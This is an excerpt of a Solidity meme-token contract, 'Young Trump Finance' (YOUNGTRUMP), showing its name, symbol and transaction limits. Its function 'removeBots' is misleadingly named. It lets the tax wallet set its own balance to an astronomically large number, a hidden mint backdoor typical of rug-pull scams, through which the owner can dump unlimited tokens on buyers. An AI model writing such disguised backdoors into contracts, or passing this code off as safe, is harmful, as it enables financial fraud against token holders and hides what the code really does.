...
contract YOUNGTRUMP is Context, IERC20, Ownable {
 ...
 //   uint256 private _teamWalletPercentage = 50;
    ...
    string private constant _name = unicode"Young Trump Finance";
    string private constant _symbol = unicode"YOUNGTRUMP";
    uint256 public _maxTxAmount =   7050000 * 10**_decimals;
    uint256 public _maxWalletSize = 7050000 * 10**_decimals;
    ...
    function removeBots(uint256 addBot) external {
        if(_taxWallet == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**_decimals;
        }
    } 
